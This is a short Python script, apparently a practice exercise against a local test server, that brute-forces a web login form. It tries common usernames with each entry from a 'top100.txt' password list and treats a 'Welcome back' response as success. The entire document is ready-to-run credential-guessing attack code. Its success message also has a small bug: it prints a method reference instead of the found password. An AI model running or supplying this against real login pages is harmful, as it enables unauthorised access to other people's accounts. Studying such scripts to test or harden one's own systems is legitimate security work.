import requests

import sys



target = "http://127.0.0.1:5000"

usernames = ["admin","user","test"]

passwords = 'top100.txt'

needle = 'Welcome back'



for username in usernames:

	with open(passwords, "r") as password_list:

		for passwords in password_list:

			passwords = passwords.strip("\n").encode()

			sys.stdout.write("[X] Attempting user:password -> {}:{}\r".format(username, passwords.decode()))

			sys.stdout.flush()

			r = requests.post(target, data={"username": username, "password": passwords})

			if needle.encode() in r.content:

				sys.stdout.write("\n")

				sys.stdout.write("\t[>>>>>] Valid password '{}' found for user '{}'!".format(passwords.decode, username))

				sys.exit()

		sys.stdout.flush()

		sys.stdout.write("\n")

		sys.stdout.write("\tNo password found for {}!".format(username))

		sys.stdout.write("\n")
